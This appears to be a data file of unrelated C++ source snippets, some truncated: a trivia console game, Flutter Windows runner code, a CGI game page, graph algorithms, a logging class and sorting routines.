    "#include <iostream>\n#include <stdlib.h> // include system pause\n#include <string> // use string var\n\nchar isTrue = 't';\nchar isFalse = 'f';\nchar myAnswer;\n\nstd::string triviaBot = \"TriviaBot: \"; // Display character named \"TriviaBot\" before the dialogue \nstd::string gamePlayer = \"User: \"; // Display character named \"TriviaBot\" before the dialogue \n\n// Questions true or false\nclass TriviaQuest {\npublic:\n\n    std::string ansCorrect = \"Correct, \";\n    std::string ansWrong = \"Wrong, \";\n\n    int myScore = 0; // +1 is added to myScore after each correct answer\n\n    void showQuestion1() {\n        // Give out instruction.\n        std::cout << triviaBot << \"Instructions. Type 't' if true and 'f' if false. \\n\";\n        system(\"pause\");\n\n        // Start Question 1\n        std::cout << \"\\n\" << triviaBot << \"1. An atom is the smallest particle. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        // Executes codes depending on myAnswer\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"an atom is not the smallest particle as there subatomic particles that are smaller. \\n\";\n            system(\"pause\"); // Pause first\n            showQuestion2(); // Proceed to next question\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"its false, there are subatomic particles that are smaller than an atom. \\n\";\n            myScore++; // +1 is added to myScore\n            system(\"pause\");\n            showQuestion2();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion2();\n        }\n\n    }\n\n    void showQuestion2() {\n\n        // Start Question 2\n        std::cout << \"\\n\" << triviaBot << \"2. Arachnophobia is the fear of bathing. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"its false, ablutophobia is the fear of bathing. \\n\";\n            system(\"pause\");\n            showQuestion3();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"ablutophobia is the fear of bathing. \\n\";\n            myScore++;\n            system(\"pause\");\n            showQuestion3();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion3();\n        }\n    }\n\n    void showQuestion3() {\n\n        // Start Question 3\n        std::cout << \"\\n\" << triviaBot << \"3. Boiling water is 100 degrees Celsius. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"it is equivalent to 212 degrees Fahrenheit. \\n\";\n            myScore++;\n            system(\"pause\");\n            showQuestion4();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"its true, it is equivalent to 212 degrees Fahrenheit. \\n\";\n            system(\"pause\");\n            showQuestion4();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion4();\n        }\n    }\n\n    void showQuestion4() {\n\n        // Start Question 4\n        std::cout << \"\\n\" << triviaBot << \"4. Butterflies taste things with their wings. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansWrong + \"its false, butterflies taste with their feet. \\n\";\n            system(\"pause\");\n            showQuestion5();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"butterflies taste with their feet. \\n\";\n            myScore++;\n            system(\"pause\");\n            showQuestion5();\n        }\n        else if (myAnswer != isTrue || isFalse)\n        {\n            std::cout << \"\\n\" << \"Wrong Input. Go to next.\" << std::endl;\n            system(\"pause\");\n            showQuestion5();\n        }\n    }\n\n    void showQuestion5() {\n\n        // Start Question 5\n        std::cout << \"\\n\" << triviaBot << \"5. Colorblind people can see color. t/f \\n\";\n        std::cout << gamePlayer;\n        std::cin >> myAnswer;\n\n        if (myAnswer == isTrue)\n        {\n            std::cout << \"\\n\" << triviaBot << ansCorrect + \"some colorblind people can see very narrow ranges of color. \\n\";\n            myScore++;\n            system(\"pause\");\n            myOverallScore();\n        }\n        else if (myAnswer == isFalse)\n        {\n            std::cout << \"\\n\" << triviaBot << ans",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <errno.h>\r\n#include <utility>\r\n#include <algorithm>\r\n#include <iomanip>\r\n#include <ctime>\r\n\r\n\r\n#include <sstream>\r\n#include <cstdlib>\r\n#include <cstring>\r\n\r\n#include <cgicc/CgiDefs.h>\r\n#include <cgicc/Cgicc.h>\r\n#include <cgicc/FormEntry.h>\r\n#include <cgicc/HTTPHTMLHeader.h>\r\n#include <cgicc/HTMLClasses.h>\r\n\r\n#include \"Object.h\"\r\n#include \"functions.h\"\r\n#include \"get_validate_inputs.h\"\r\n\r\nusing namespace std;\r\nusing namespace cgicc;\r\n\r\nint main() {\r\n\r\n    Cgicc cgi;\r\n    cout << \"Content-type:text/html\\r\\n\\r\\n\";\r\n    cout << \"<html>\\n\";\r\n    cout << \"<head>\\n\";\r\n    cout << \"<title>CPS 3525 Project 3</title>\\n\";\r\n\r\n    //Script shows file upload section when button is clicked\r\n    cout << \"<script>\";\r\n    cout << \"function myFunction() {\";\r\n    cout << \"var x = document.getElementById('myDIV');\";\r\n    cout << \"if (x.style.display === 'none') {x.style.display = 'block';} else {x.style.display = 'none';\";\r\n    cout << \"}\";\r\n    cout << \"}\";\r\n    cout << \"</script>\";\r\n    \r\n    cout << \"<style>\";\r\n    cout << \"#myDIV {display: none;}\";\r\n    cout << \"body {font-family: Arial, sans-serif;margin: 0;padding: 0;background-color: #302222;}\" << endl;\r\n    cout << \".container {text-align: center;max-width: 800px;margin: 0 auto;margin-top: 20px;padding: 20px;background-color: #fff;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);}\" << endl;\r\n    cout << \".center {margin-left: auto;margin-right: auto;text-align: center;}\";\r\n    cout << \".container h1 {text-align: center;}\";\r\n    cout << \"</style>\";\r\n\r\n    cout << \"</head>\\n\";\r\n    cout << \"<body>\\n\";\r\n    cout << \"<div class='container'>\";\r\n    cout << \"<center><img src='../CPS3525/gridgame.png' alt='gridgame'></center>\\n\";\r\n    cout << \"<br>\";\r\n    \r\n    string game = cgi(\"game\");\r\n    string option = cgi(\"option\");\r\n\r\n    processInputs(game, option, cgi);\r\n    \r\n    \r\n    cout << \"<hr>\";\r\n\r\n    cout << \"</div>\";\r\n    cout << \"</body>\\n\";\r\n    cout << \"</html>\\n\";\r\n    return 0;\r\n}\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// NAME: GAL BEN AMI\n\n#include <climits>\n#include \"Algorithms.hpp\"\n#include \"Graph.hpp\"\n#include <queue>\n#include <limits>\n#include <vector>\n#include <set>\n#include <algorithm>\n\nusing namespace std;\nusing namespace ariel;\n\n// Enum to represent the color of a vertex in the graph\n// used in the cycle detection algorithm\nenum Color {WHITE, GRAY, BLACK};\n\n// Helper function to construct the path from the parent array\nstring constructPath(const vector<int>& parent, int start, int end)\n{\n    if (parent[(size_t)end] == -1)\n        return \"No path found\";\n\n    string path = to_string(end);\n    while (end != start)\n    {\n        end = parent[(size_t)end];\n        path = to_string(end) + \"->\" + path;\n    }\n    return path;\n}\n\n// Helper function to construct the cycle path\n// The cycle path is constructed from the cyclePath vector\nstring cycleConstructor(vector<int>& cyclePath, int startingVertex) {\n    string cycle;\n    size_t i = 0;\n    for ( i = 0 ; i < cyclePath.size() ; i++) {\n        if (cyclePath[i] == startingVertex) {\n            break;\n        }\n    }\n    for (size_t j = i; j < cyclePath.size(); j++) {\n        cycle = cycle + to_string(cyclePath[j]) + \"->\";\n    }\n    cycle = cycle + to_string(startingVertex);\n    return cycle;\n}\n\n\n\n// BFS function\nstring BFS(Graph &graph, int start, int end)\n{\n    vector<vector<int>> adjMatrix = graph.getAdjacencyMatrix();\n    size_t numVertices = graph.getNumVertices();\n    vector<int> parentVertx(numVertices, -1);\n    vector<bool> visited(numVertices, false);\n    string shortestpath = \"\";\n    queue<int> q;\n    // Mark the start vertex as visited\n    visited[(size_t)start] = true;\n    // Set the parentVertxious node of the start vertex as itself\n    // parentVertx[start] = start;\n    // Add the start vertex to the queue\n    q.push(start);\n\n    // While the queue is not empty\n    while (!q.empty())\n    {\n        // Get the front vertex of the queue\n        int current = q.front();\n        // Remove the front vertex from the queue\n        q.pop();\n\n        // If the current vertex is the end vertex, break the loop\n        if (current == end)\n            break;\n\n        // For each vertex in the graph\n        for (size_t i = 0; i < numVertices; ++i)\n        {\n            // If the current vertex is connected to the i-th vertex and the i-th vertex is not visited\n            if (adjMatrix[(size_t)current][i] != 0 && !visited[i])\n            {\n                // Add the i-th vertex to the queue\n                q.push(i);\n                // Mark the i-th vertex as visited\n                visited[i] = true;\n                // Set the parentVertxious node of the i-th vertex as the current vertex\n                parentVertx[i] = current;\n            }\n        }\n    }\n\n    return constructPath(parentVertx, start, end);\n}\n\n// Dijkstra function\nstring Dijkstra(Graph &graph, int start, int end)\n{\n    size_t numVertices = graph.getNumVertices();\n    vector<bool> visited(numVertices, false);\n    vector<int> d(numVertices, INT_MAX);\n    vector<int> parentVertx(numVertices, -1);\n\n    // Initialize the priority queue for Dijkstra's algorithm\n    priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> pq;\n\n    // Initialize the distance of the start vertex as 0\n    d[(size_t)start] = 0;\n    // Add the start vertex to the priority queue\n    pq.push({0, start});\n\n    // While the priority queue is not empty\n    while (!pq.empty()){\n        // Get the vertex with the smallest distance\n        int u = pq.top().second;\n        // Remove the vertex from the priority queue\n        pq.pop();\n\n        // If the vertex has been visited, skip it\n        if (visited[(size_t)u])\n            continue;\n\n        // Mark the vertex as visited\n        visited[(size_t)u] = true;\n\n        // For each vertex in the graph\n        for (size_t v = 0; v < numVertices; ++v){\n            // If the u-th vertex is connected to the v-th vertex and the v-th vertex is not visited\n            if (graph.getAdjacencyMatrix()[(size_t)u][v] != 0 && !visited[v]){\n                // Calculate the new distance to the v-th vertex\n                int newdistance = d[(size_t)u] + graph.getAdjacencyMatrix()[(size_t)u][v];\n                // If the new distance is smaller than the current distanceance\n                if (newdistance < d[v]){\n                    // Update the distance to the v-th vertex\n                    d[v] = newdistance;\n                    // Set the parentVertxious node of the v-th vertex as the u-th vertex\n                    parentVertx[v] = u;\n                    // Add the v-th vertex to the priority queue\n                    pq.push({d[v], v});\n                }\n            }\n        }\n    }\n    // at this stage, parentVertx contains the shortest path from start to end\n    return constructPath(parentVertx, start, end);\n}\n\nstring bellmanford(Graph& graph, int start, int end){\n    size_t numVertices = graph.getNumVertices();\n    vector<int> d(numVertices, INT_MAX);\n    vector<int> parentV",
    "//\n// Created by pyq on 2024/5/6.\n//\n\n#include \"log.h\"\n\n// Constructor: Initializes the log system defaults.\nLog::Log() : lineCount_(0), day_(0), isAsync_(false), fp_(nullptr),  blockDeque_(nullptr), writeThread_(nullptr) {}\n\n// Destructor: Ensures all resources are properly released and threads joined.\nLog::~Log() {\n    if (writeThread_ && writeThread_->joinable()) {\n        while (!blockDeque_->empty()) {\n            blockDeque_->flush();\n        }\n        blockDeque_->close();\n        writeThread_->join();\n    }\n    if (fp_) {\n        std::lock_guard<std::mutex> locker(mutex_);\n        Flush();\n        fclose(fp_);\n    }\n}\n\n// Retrieves the singleton instance of the Log class.\nLog* Log::Instance() {\n    static Log instance;\n    return &instance;\n}\n\n// Triggers asynchronous log flushing.\nvoid Log::AsyncFlushLog() {\n    Log::Instance()->AsyncWrite_();\n}\n\n// Flushes the log buffer to the file.\nvoid Log::Flush() {\n    if (isAsync_) {\n        blockDeque_->flush();\n    }\n    fflush(fp_);\n}\n\n// Writes a formatted log message at a given log level.\nvoid Log::Write(int level, const char* format, ...) {\n    struct timeval now = {0, 0};\n    gettimeofday(&now, nullptr);\n    time_t tSec = now.tv_sec;\n    struct tm *sysTime = localtime(&tSec);\n    struct tm t = *sysTime;\n    va_list vaList;\n\n    // One log file per day, and the maximum number of lines in a single log file is guaranteed to be MAX_LINES\n    if (day_ != t.tm_mday || (lineCount_ && (lineCount_ % MAX_LINES == 0))) {\n        std::unique_lock<std::mutex> locker(mutex_);\n        locker.unlock();\n        char newFile[LOG_NAME_LEN];\n        char tail[36] = {0};\n        snprintf(tail, 36, \"%04d_%02d_%02d\", t.tm_year + 1900, t.tm_mon + 1, t.tm_mday);\n        if (day_ != t.tm_mday) {\n            snprintf(newFile, LOG_NAME_LEN - 72, \"%s/%s%s\", path_, tail, suffix_);\n            day_ = t.tm_mday;\n            lineCount_ = 0;\n        } else {\n            snprintf(newFile, LOG_NAME_LEN - 72, \"%s/%s-%d%s\", path_, tail, (lineCount_ / MAX_LINES), suffix_);\n        }\n        locker.lock();\n        Flush();\n        fclose(fp_);\n        fp_ = fopen(newFile, \"a\");\n        assert(fp_ != nullptr);\n    }\n    {\n        std::unique_lock<std::mutex> locker(mutex_);\n        int n = snprintf(buffer_.BeginWrite(), 128, \"%d-%02d-%02d %02d:%02d:%02d.%06ld \", t.tm_year + 1900, t.tm_mon + 1, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec, now.tv_usec);\n        buffer_.AdvanceWritePointer(n);\n        AppendLogLevelTitle_(level);\n        ++lineCount_;\n        va_start(vaList, format);\n        int m = vsnprintf(buffer_.BeginWrite(), buffer_.GetWritableBytes(), format, vaList);\n        va_end(vaList);\n        buffer_.AdvanceWritePointer(m);\n        buffer_.Append(\"\\n\\0\", 2);\n\n        // synchronous or asynchronous logging\n        if (isAsync_ && blockDeque_ && !blockDeque_->full()) {\n            blockDeque_->push_back(buffer_.RetrieveAllAsString());\n        } else {\n            fputs(buffer_.BeginRead(), fp_);\n        }\n        buffer_.RetrieveAll();\n    }\n}\n\n// Initializes the logging system with specific parameters.\nvoid Log::Init(int level, const char* path, const char* suffix, int capacity) {\n    level_ = level;\n    isOpen_ = true;\n    path_ = strdup(path);\n    suffix_ = strdup(suffix);\n    if (capacity > 0) {\n        isAsync_ = true;\n        if (!blockDeque_) {\n            std::unique_ptr<BlockDeque<std::string>> blockDeque(new BlockDeque<std::string>(capacity));\n            blockDeque_ = move(blockDeque);\n            std::unique_ptr<std::thread> writeThread(new std::thread(AsyncFlushLog));\n            writeThread_ = move(writeThread);\n        }\n    } else {\n        isAsync_ = false;\n    }\n\n    lineCount_ = 0;\n    time_t timer = time(nullptr);\n    struct tm* sysTime = localtime(&timer);\n    struct tm t = *sysTime;\n    char fileName[LOG_NAME_LEN] = {0};\n    snprintf(fileName, LOG_NAME_LEN - 1, \"%s/%04d_%02d_%02d%s\", path_, t.tm_year + 1900, t.tm_mon + 1, t.tm_mday, suffix_);\n    day_ = t.tm_mday;\n\n    {\n        std::lock_guard<std::mutex> locker(mutex_);\n        buffer_.RetrieveAll();\n        if (fp_) {\n            Flush();\n            fclose(fp_);\n        }\n        fp_ = fopen(fileName, \"a\");\n        if (fp_ == nullptr) {\n            mkdir(path_, 0777);\n            fp_ = fopen(fileName, \"a\");\n        }\n        assert(fp_ != nullptr);\n    }\n}\n\n// Returns the current log level.\nint Log::GetLevel() {\n    std::lock_guard<std::mutex> locker(mutex_);\n    return level_;\n}\n\n// Sets the current log level.\nvoid Log::SetLevel(int level) {\n    std::lock_guard<std::mutex> locker(mutex_);\n    level_ = level;\n}\n\n// Checks if the log file is open.\nbool Log::IsOpen() {\n    return isOpen_;\n}\n\n// Appends the log level title to the log message.\nvoid Log::AppendLogLevelTitle_(int level) {\n    const char* titles[] = {\"[debug]: \", \"[info] : \", \"[warn] : \", \"[error]: \"};\n    buffer_.Append(titles[level], strlen(titles[level]));\n}\n\n// Writes log messages stored in the block deque to the file.\nvoid Log::AsyncWrite_() {\n",
    "#include <bits/stdc++.h>\r\n#define MAXSIZE 10\r\nusing namespace std;\r\n\r\nvoid iniArr(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tarr[i] = rand() % 20;\r\n\t}\r\n}\r\n\r\nvoid showArr(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tcout << arr[i] << \" \";\r\n\t}\r\n\tcout << endl << \"------------\";\r\n}\r\n\r\n//\u5192\u6ce1\u6392\u5e8f\r\nvoid bubSort(int arr[], int length) {\r\n\twhile (length--)\r\n\t{\r\n\t\tfor (int i = 0; i < length; i++) {\r\n\t\t\tif (arr[i + 1] < arr[i]) {\r\n\t\t\t\tint temp = arr[i + 1];\r\n\t\t\t\tarr[i + 1] = arr[i];\r\n\t\t\t\tarr[i] = temp;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//\u9009\u62e9\u6392\u5e8f\r\nvoid selectSort(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tint k = i;\r\n\t\tfor (int j = i + 1; j < length; j++) {\r\n\t\t\tif (arr[j] < arr[k]) {\r\n\t\t\t\tk = j;\r\n\t\t\t}\r\n\t\t}\r\n\t\tint temp = arr[i];\r\n\t\tarr[i] = arr[k];\r\n\t\tarr[k] = temp;\r\n\r\n\t}\r\n}\r\n\r\n\r\n//\u63d2\u5165\u6392\u5e8f\r\nvoid insertSort(int arr[], int length) {\r\n\tfor (int i = 1; i < length; i++) {\r\n\t\tint key = arr[i];\r\n\t\tint j = i - 1;\r\n\r\n\t\t// \u5c06\u5143\u7d20arr[i]\u63d2\u5165\u5230\u5df2\u6392\u5e8f\u7684\u5e8f\u5217arr[0..i-1]\u4e2d  \r\n\t\twhile (j >= 0 && arr[j] > key) {\r\n\t\t\tarr[j + 1] = arr[j];\r\n\t\t\tj--;\r\n\t\t}\r\n\t\tarr[j + 1] = key;\r\n\t}\r\n}\r\n\r\n//\u63d2\u5165\u65b0\u7684\u5143\u7d20\r\nvoid insertElement(int arr[], int length, int newElement) {\r\n\tint i;\r\n\tfor (i = length - 1; (i >= 0 && arr[i] > newElement); i--) {\r\n\t\tarr[i + 1] = arr[i]; // \u5c06\u5143\u7d20\u5411\u540e\u79fb\u52a8  \r\n\t}\r\n\tarr[i + 1] = newElement; // \u63d2\u5165\u65b0\u5143\u7d20  \r\n\r\n\t// \u6ce8\u610f\uff1a\u7531\u4e8e\u6570\u7ec4\u5927\u5c0f\u56fa\u5b9a\uff0c\u8fd9\u91cc\u7684\u201c\u63d2\u5165\u201d\u5b9e\u9645\u4e0a\u662f\u8986\u76d6\u4e86\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002  \r\n\t// \u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u60a8\u53ef\u80fd\u9700\u8981\u91cd\u65b0\u5206\u914d\u6570\u7ec4\u7684\u5927\u5c0f\u6765\u771f\u6b63\u63d2\u5165\u4e00\u4e2a\u65b0\u5143\u7d20\u3002  \r\n}\r\n\r\n//\u5e0c\u5c14\u6392\u5e8f\r\nvoid shellSort(int arr[], int length) {\r\n\tint h = 1;\r\n\tint t = length / 3;\r\n\twhile (h<t)\r\n\t{\r\n\t\th = 3 * h - 1;\r\n\t}\r\n\twhile (h >= 1) {\r\n\t\tfor (int i = h; i < length; i++) {\r\n\t\t\tfor (int j = i; j >= h && arr[j] < arr[j - h]; j--) {\r\n\t\t\t\tint temp = arr[j];\r\n\t\t\t\tarr[j] = arr[j - h];\r\n\t\t\t\tarr[j - h] = temp;\r\n\t\t\t}\r\n\t\t}\r\n\t\th /= 3;\r\n\t}\r\n}\r\n\r\n//\u5feb\u901f\u6392\u5e8f\r\nvoid quickSort(int arr[], int left, int right) {\r\n\tif (left >= right) {\r\n\t\treturn;\r\n\t}\r\n\tint i = left;\r\n\tint j = right;\r\n\tint pivot = arr[i];\r\n\twhile (i < j)\r\n\t{\r\n\t\twhile (i < j && arr[j] >= pivot)\r\n\t\t\tj--;\r\n\t\t\tarr[i] = arr[j];\r\n\t\twhile (i < j && arr[i] <= pivot)\r\n\t\t\t\t\ti++;\r\n\t\t\tarr[j] = arr[i];\r\n\t}\r\n\t//\u5f53j=i\u65f6\uff0c\u8f74\u786e\u5b9a\r\n\tarr[i] = pivot;\r\n\tquickSort(arr, left, i - 1);\r\n\tquickSort(arr, i + 1, right);\r\n}\r\n\r\n//\u5f52\u5e76\u6392\u5e8f\r\n//\u9ed8\u8ba4\u5e8f\u5217a\u4e0e\u5e8f\u5217b\u90fd\u662f\u6709\u5e8f\u5e8f\u5217\r\nvoid mergesort1(int aArr[], int alen, int bArr[], int blen, int* temp) {\r\n\tint i = 0;\r\n\tint j = 0;\r\n\tint k = 0;\r\n\twhile (i < alen && j < blen)\r\n\t{\r\n\t\t//\u4f7f\u7528\u4e09\u76ee\u8fd0\u7b97\u7b26\u4f7f\u4ee3\u7801\u66f4\u52a0\u7b80\u6d01\r\n\t\ttemp[k++] = aArr[i] < bArr[j] ? aArr[i++] : 